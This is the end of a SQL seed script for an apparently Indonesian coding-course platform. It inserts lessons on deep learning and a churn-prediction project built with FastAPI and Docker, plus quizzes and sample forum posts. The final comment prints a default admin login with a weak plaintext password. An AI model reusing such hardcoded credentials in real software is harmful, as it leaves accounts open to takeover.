- **Mixed precision + gradient accumulation** untuk training model besar pada GPU terbatas.
- **Monitor**: loss, gradient norm, weight norm, learning rate, val metric.

## MLOps untuk Deep Learning

- **Experiment tracking** — MLflow, W&B, TensorBoard.
- **Versioning data + model** — DVC, HuggingFace Hub.
- **Serving** — TorchServe, Triton, ONNX Runtime, vLLM untuk LLM.
- **Monitoring** — data drift, concept drift, performance, latency.
- **Quantization & pruning** — kompres model untuk edge/mobile.

## Kesimpulan

Deep learning adalah mesin di balik revolusi AI modern. CNN untuk vision, RNN/LSTM untuk sequence klasik, dan Transformer untuk hampir semua tugas modern. Memahami blok bangunan (conv, attention, batchnorm, transfer learning) lebih penting daripada menghafal setiap arsitektur. Yang membedakan praktisi hebat adalah **kemampuan eksperimen terkontrol**: hipotesis → tracking → diagnosis → iterasi. Pada level berikutnya kita akan menerapkan semuanya dalam project end-to-end.



## Studi Kasus: Model Prediksi

Collect data, Preprocessing, Train, Evaluate, Deploy.

## Tips

> Kuasai Python, NumPy, Pandas sebelum ML framework.', '⚡', false, '[{"question":"Arsitektur deep learning yang khusus untuk data gambar?","options":["RNN","CNN","Transformer","MLP"],"answer":1,"explanation":"CNN menggunakan convolution untuk belajar pola lokal hierarkis pada gambar."},{"question":"Mekanisme inti yang membuat Transformer paralel dan scaling baik?","options":["Recurrence","Self-attention","Pooling","Dropout"],"answer":1,"explanation":"Self-attention memproses seluruh sequence paralel, tidak perlu rekurens."},{"question":"Strategi hemat waktu training untuk dataset kecil?","options":["Train dari nol","Transfer learning dari pre-trained","Hapus regularization","Naikkan learning rate drastis"],"answer":1,"explanation":"Transfer learning memanfaatkan fitur pre-trained; efektif untuk data terbatas."}]', NOW(), NOW());
INSERT INTO "Material" (id, level, "order", title, slug, description, content, icon, "isProject", quiz, "createdAt", "updatedAt") VALUES ('project-ml-model', 8, 8, 'Project: ML Model', 'project-ml-model', 'Project end-to-end: bangun, training, deploy, dan monitor model ML.', '# Project: ML Model End-to-End


![Project: ML Model](https://sfile.chatglm.cn/images-ppt/7ad703572113.png)

Selamat! Anda telah sampai di project akhir. Di sini kita merangkai semua yang telah dipelajari—Python, preprocessing, supervised/unsupervised, neural network—menjadi satu pipeline ML end-to-end yang siap produksi. Project ini membangun **model prediksi churn pelanggan** dengan workflow yang dapat direplikasi: dari data hingga deployment dan monitoring.

![Project ML Model](https://sfile.chatglm.cn/images-ppt/2ccd2dc8282b.png)

## Skema Project

```text
┌──────────────┐   ┌──────────────┐   ┌──────────────┐
│  Raw Data    │ → │ Preprocess   │ → │ Feature Eng  │
│  (CSV/DB)    │   │ (clean,fill) │   │ (date,enc)   │
└──────────────┘   └──────────────┘   └──────┬───────┘
                                              ↓
┌──────────────┐   ┌──────────────┐   ┌──────────────┐
│  Monitoring  │ ← │ Deploy API   │ ← │ Train + Eval │
│  (drift,met) │   │  (FastAPI)   │   │  (XGBoost)   │
└──────────────┘   └──────────────┘   └──────────────┘
```

## Struktur Folder

```text
churn-project/
├── data/
│   ├── raw/                  # immutable raw
│   ├── interim/              # intermediate
│   └── processed/            # train/val/test splits
├── notebooks/                # EDA & eksperimen
├── src/
│   ├── data.py               # load & split
│   ├── features.py           # preprocessing pipeline
│   ├── train.py              # training
│   ├── evaluate.py           # metrics + reports
│   ├── serve.py              # FastAPI app
│   └── config.py             # konfigurasi
├── tests/
├── models/                   # serialized artifacts
├── deployment/
│   ├── Dockerfile
│   └── docker-compose.yml
├── requirements.txt
├── Makefile
└── README.md
```

## Step 1: Eksplorasi & Data Loading

```python
# src/data.py
import pandas as pd
from sklearn.model_selection import train_test_split
from pathlib import Path

def load_data(path="data/raw/churn.csv"):
    df = pd.read_csv(path)
    df["signup_date"] = pd.to_datetime(df["signup_date"])
    df["last_activity"] = pd.to_datetime(df["last_activity"])
    return df

def split_data(df, test_size=0.2, val_size=0.2, random_state=42):
    train, test = train_test_split(df, test_size=test_size,
                                   stratify=df["churn"], random_state=random_state)
    train, val = train_test_split(train, test_size=val_size/(1-test_size),
                                  stratify=train["churn"], random_state=random_state)
    return train, val, test

if __name__ == "__main__":
    df = load_data()
    train, val, test = split_data(df)
    print(f"Train: {len(train)}, Val: {len(val)}, Test: {len(test)}")
    print(f"Churn rate train: {train[''churn''].mean():.3f}")
    train.to_parquet("data/processed/train.parquet")
    val.to_parquet("data/processed/val.parquet")
    test.to_parquet("data/processed/test.parquet")
```

## Step 2: Feature Engineering Pipeline

```python
# src/features.py
from sklearn.compose import ColumnTransformer
from sklearn.pipeline import Pipeline
from sklearn.preprocessing import StandardScaler, OneHotEncoder
from sklearn.impute import SimpleImputer
import pandas as pd
import numpy as np

NUMERIC = ["age", "monthly_spend", "tenure_months", "sessions_last_30d"]
CATEGORICAL = ["plan_type", "country", "payment_method"]

def build_preprocessor():
    num_pipe = Pipeline([
        ("imputer", SimpleImputer(strategy="median")),
        ("scaler", StandardScaler()),
    ])
    cat_pipe = Pipeline([
        ("imputer", SimpleImputer(strategy="most_frequent")),
        ("onehot", OneHotEncoder(handle_unknown="ignore", sparse_output=False)),
    ])
    return ColumnTransformer([
        ("num", num_pipe, NUMERIC),
        ("cat", cat_pipe, CATEGORICAL),
    ])

def add_engineered_features(df):
    df = df.copy()
    df["days_since_activity"] = (pd.Timestamp.today() - df["last_activity"]).dt.days
    df["spend_per_session"] = df["monthly_spend"] / (df["sessions_last_30d"] + 1)
    df["is_high_value"] = (df["monthly_spend"] > df["monthly_spend"].quantile(0.75)).astype(int)
    return df
```

## Step 3: Training dengan XGBoost

```python
# src/train.py
import xgboost as xgb
from sklearn.metrics import f1_score, roc_auc_score, classification_report
import joblib, json
from data import load_data, split_data
from features import build_preprocessor, add_engineered_features

def train():
    df = load_data()
    df = add_engineered_features(df)
    train, val, _ = split_data(df)

    feature_cols = ["age", "monthly_spend", "tenure_months", "sessions_last_30d",
                    "plan_type", "country", "payment_method",
                    "days_since_activity", "spend_per_session", "is_high_value"]
    X_train, y_train = train[feature_cols], train["churn"]
    X_val, y_val = val[feature_cols], val["churn"]

    preprocessor = build_preprocessor()
    X_train_p = preprocessor.fit_transform(X_train)
    X_val_p = preprocessor.transform(X_val)

    model = xgb.XGBClassifier(
        n_estimators=500, max_depth=6, learning_rate=0.05,
        subsample=0.8, colsample_bytree=0.8,
        scale_pos_weight=(len(y_train) - y_train.sum()) / y_train.sum(),
        eval_metric="auc", early_stopping_rounds=20, random_state=42
    )
    model.fit(X_train_p, y_train, eval_set=[(X_val_p, y_val)], verbose=False)

    y_pred = model.predict(X_val_p)
    y_prob = model.predict_proba(X_val_p)[:, 1]
    metrics = {
        "f1": float(f1_score(y_val, y_pred)),
        "auc": float(roc_auc_score(y_val, y_prob)),
    }
    print(classification_report(y_val, y_pred))
    print(f"Val AUC: {metrics[''auc'']:.4f}, F1: {metrics[''f1'']:.4f}")

    joblib.dump({"preprocessor": preprocessor, "model": model,
                 "features": feature_cols}, "models/churn_model.joblib")
    with open("models/metrics.json", "w") as f:
        json.dump(metrics, f, indent=2)

if __name__ == "__main__":
    train()
```

## Step 4: API Deployment dengan FastAPI

```python
# src/serve.py
from fastapi import FastAPI, HTTPException
from pydantic import BaseModel, Field
import pandas as pd, joblib

app = FastAPI(title="Churn Prediction API", version="1.0.0")
artifact = joblib.load("models/churn_model.joblib")
preprocessor = artifact["preprocessor"]
model = artifact["model"]
features = artifact["features"]

class CustomerData(BaseModel):
    age: int = Field(..., ge=0, le=150)
    monthly_spend: float = Field(..., ge=0)
    tenure_months: int = Field(..., ge=0)
    sessions_last_30d: int = Field(..., ge=0)
    plan_type: str
    country: str
    payment_method: str
    days_since_activity: int = Field(..., ge=0)
    spend_per_session: float = Field(..., ge=0)
    is_high_value: int = Field(..., ge=0, le=1)

@app.get("/health")
def health(): return {"status": "ok"}

@app.post("/predict")
def predict(c: CustomerData):
    try:
        df = pd.DataFrame([c.dict()])
        X = preprocessor.transform(df[features])
        prob = float(model.predict_proba(X)[0, 1])
        pred = int(prob > 0.5)
        return {"churn_probability": prob, "prediction": pred,
                "risk_level": "high" if prob > 0.7 else "medium" if prob > 0.3 else "low"}
    except Exception as e:
        raise HTTPException(400, str(e))
```

```bash
# Run API
uvicorn src.serve:app --host 0.0.0.0 --port 8000 --reload

# Test
curl -X POST http://localhost:8000/predict \
  -H "Content-Type: application/json" \
  -d ''{"age":32,"monthly_spend":85.5,"tenure_months":14,"sessions_last_30d":22,
       "plan_type":"pro","country":"ID","payment_method":"credit_card",
       "days_since_activity":3,"spend_per_session":3.7,"is_high_value":0}''
```

## Step 5: Dockerize

```dockerfile
# deployment/Dockerfile
FROM python:3.11-slim
WORKDIR /app
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt
COPY src/ ./src/
COPY models/ ./models/
EXPOSE 8000
CMD ["uvicorn", "src.serve:app", "--host", "0.0.0.0", "--port", "8000"]
```

```yaml
# deployment/docker-compose.yml
version: "3.9"
services:
  api:
    build: ..
    ports: ["8000:8000"]
    environment:
      MODEL_PATH: /app/models/churn_model.joblib
    healthcheck:
      test: ["CMD", "curl", "-f", "http://localhost:8000/health"]
      interval: 30s
      retries: 3
    restart: unless-stopped
    deploy:
      resources:
        limits: {cpus: "1.0", memory: 512M}
```

```bash
docker compose -f deployment/docker-compose.yml up -d --build
```

## Step 6: Monitoring & MLOps

```python
# Tambahkan ke serve.py: log prediksi untuk monitoring
import structlog, time
log = structlog.get_logger()

@app.middleware("http")
async def log_requests(request, call_next):
    start = time.time()
    response = await call_next(request)
    duration = time.time() - start
    log.info("prediction",
             path=request.url.path,
             status=response.status_code,
             duration_ms=round(duration*1000, 2))
    return response

# Monitor distribusi prediksi (data drift)
from collections import deque
recent_probs = deque(maxlen=1000)

@app.post("/predict")
def predict(c: CustomerData):
    # ... existing logic ...
    recent_probs.append(prob)
    if len(recent_probs) >= 100:
        import numpy as np
        arr = np.array(recent_probs)
        log.info("drift_check",
                 mean=float(arr.mean()),
                 p95=float(np.quantile(arr, 0.95)),
                 n=len(arr))
    return {...}
```

```text
Checklist MLOps:
□ Model versioning (MLflow registry / joblib + git tag)
□ Data versioning (DVC)
□ Experiment tracking (MLflow / W&B)
□ CI/CD pipeline (GitHub Actions: test + build + deploy)
□ API monitoring (Prometheus + Grafana)
□ Data drift detection (Evidently / Alibi Detect)
□ Alerting (Slack/PagerDuty) bila AUC < threshold
□ Retraining schedule (weekly/monthly or trigger-based)
□ Shadow deployment untuk model baru
□ A/B test sebelum full rollout
```

## Step 7: Makefile untuk Reproducibility

```makefile
# Makefile
.PHONY: install data train evaluate serve test docker-build docker-up

install:
	pip install -r requirements.txt

data:
	python -m src.data

train:
	python -m src.train

evaluate:
	python -m src.evaluate

serve:
	uvicorn src.serve:app --reload --port 8000

test:
	pytest tests/ -v --cov=src

docker-build:
	docker compose -f deployment/docker-compose.yml build

docker-up:
	docker compose -f deployment/docker-compose.yml up -d
```

## Tips & Best Practices

- **Reproducibility**: pin semua versi di requirements.txt, set random seed.
- **Test-driven**: unit test untuk preprocessing & prediksi (`pytest`).
- **Document model** dengan **model card** (asumsi, limitasi, etika).
- **Shadow mode** untuk model baru—log prediksi tanpa impact pengguna.
- **Canary rollout**: 5% → 25% → 100% dengan metric monitoring.
- **Champion/challenger**: bandingkan model baru vs produksi.
- **Plan for failure**: rollback otomatis bila metric drop.

## Kesimpulan

Project ini merangkum siklus ML end-to-end: data → preprocessing → training → evaluation → deployment → monitoring. Yang membedakan project "berjalan di laptop" dari "berjalan di produksi" adalah **reproducibility, testing, monitoring, dan plan for failure**. Dengan workflow ini, Anda siap menghadapi tantangan ML di industri: data berubah, model degradasi, stakeholder minta penjelasan. Selamat! Anda telah menyelesaikan perjalanan dari IT dasar hingga machine learning produksi. Teruslah bereksperimen—ML adalah bidang yang berubah cepat dan pembelajaran tidak pernah berhenti.



## Studi Kasus: Model Prediksi

Collect data, Preprocessing, Train, Evaluate, Deploy.

## Tips

> Kuasai Python, NumPy, Pandas sebelum ML framework.', '🎯', true, '[{"question":"Urutan yang benar dalam workflow ML end-to-end?","options":["Deploy → Train → Data → Eval","Data → Train → Eval → Deploy → Monitor","Train → Data → Deploy → Eval","Eval → Deploy → Data → Train"],"answer":1,"explanation":"Workflow: data collection → training → evaluation → deployment → monitoring."},{"question":"Framework yang direkomendasikan untuk serving model sebagai API?","options":["Matplotlib","FastAPI","pandas","NumPy"],"answer":1,"explanation":"FastAPI ringan, async, auto-generate docs—ideal untuk model serving."},{"question":"Hal krusial untuk mendeteksi degradasi model di produksi?","options":["Disable logging","Monitoring data drift + concept drift","Pakai latest tag","Retrain harian tanpa evaluasi"],"answer":1,"explanation":"Data/concept drift mendeteksi perubahan distribusi yang menyebabkan akurasi turun."}]', NOW(), NOW());

-- 5. INSERT FORUM POSTS
INSERT INTO "ForumPost" (id, "userId", title, content, category, "createdAt", "updatedAt") VALUES ('post-001', 'admin-001', 'Cara mengatasi error port already in use', 'Saat menjalankan npm run dev muncul error port sudah digunakan. Solusi?', 'Pertanyaan', NOW(), NOW());
INSERT INTO "ForumPost" (id, "userId", title, content, category, "createdAt", "updatedAt") VALUES ('post-002', 'admin-001', 'Tips belajar Python untuk pemula', 'Mulai dari dasar variabel dulu, coding jadi jauh lebih mudah!', 'Tips & Trik', NOW(), NOW());
INSERT INTO "ForumPost" (id, "userId", title, content, category, "createdAt", "updatedAt") VALUES ('post-003', 'admin-001', 'Sharing: Pengalaman setup Docker', 'Akhirnya berhasil containerize aplikasi dengan Docker!', 'Sharing', NOW(), NOW());

-- 6. INSERT FORUM REPLY
INSERT INTO "ForumReply" (id, "postId", "userId", content, "createdAt") VALUES ('reply-001', 'post-001', 'admin-001', 'Coba gunakan npx kill-port 3000 untuk menghentikan proses yang menggunakan port tersebut.', NOW());

-- ================================================
-- SELESAI! Database siap digunakan.
-- Admin login: admin@coderoom.id / admin12345
-- ================================================
